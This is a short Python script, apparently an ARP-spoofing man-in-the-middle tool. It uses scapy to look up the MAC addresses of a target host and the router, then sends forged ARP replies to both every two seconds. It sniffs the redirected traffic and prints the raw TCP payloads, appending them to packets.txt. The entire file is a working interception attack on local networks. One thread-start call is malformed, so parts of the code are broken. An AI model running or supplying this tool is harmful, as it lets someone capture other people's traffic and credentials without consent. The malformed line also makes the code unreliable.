import scapy.all as scapy
from urllib import parse
import netifaces
import _thread
import time
import re


# -- Functions --


def get_ip_addresses():
    """Get all IP addresses in your current network"""
    return [netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr'] for iface in netifaces.interfaces() if netifaces.AF_INET in netifaces.ifaddresses(iface)]


def get_router_address():
    """Get Router IP"""
    gws = netifaces.gateways()
    return list(gws['default'][netifaces.AF_INET])[0]  # 192.168.2.1


def get_mac_address(ip):
    """Get the mac-address of ```ip```"""
    broadcast_layer = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_layer = scapy.ARP(pdst=ip)

    get_mac_packet = broadcast_layer/arp_layer
    answer = scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]

    return answer[0][1].hwsrc


def _spoof(r_ip, t_ip, r_mac, t_mac):
    """Spoof ```t-ip``` to send its packets to you"""
    packet1 = scapy.ARP(op=2, hwdst=r_mac, pdst=r_ip, psrc=t_ip)
    packer2 = scapy.ARP(op=2, hwdst=t_mac, pdst=t_ip, psrc=r_ip)

    scapy.send(packet1)
    scapy.send(packer2)


def pkt_parser(packet):
    """Well... packet parser..."""
    if packet.haslayer(scapy.TCP) and packet.haslayer(scapy.Raw) and packet.haslayer(scapy.IP):
        body = str(packet[scapy.TCP].payload)
        print(body)
        with open("./packets.txt", "a", encoding="utf-8") as f:  # ISO-8859-1
            f.write(body + "\n")


def spoof(r_ip, t_ip, r_mac, t_mac):
    while True:
        _spoof(r_ip, t_ip, r_mac, t_mac)
        time.sleep(2)


# -- Variables --
iface = "wlan1"
# target_ips = get_ip_addresses()  # if you want to use this make your own things to make it work
target_ip = "IP ADDR"
router_ip = get_router_address()
target_mac = get_mac_address(target_ip)
router_mac = get_mac_address(router_ip)

try:
    # -- Spoof Thread --
    _thread.start_new_thread()
    _thread.start_new_thread(
        spoof, (router_ip, target_ip, router_mac, target_mac))

    # -- Main --
    scapy.sniff(prn=pkt_parser, store=0)  # iface=iface,
except KeyboardInterrupt:
    exit(0)
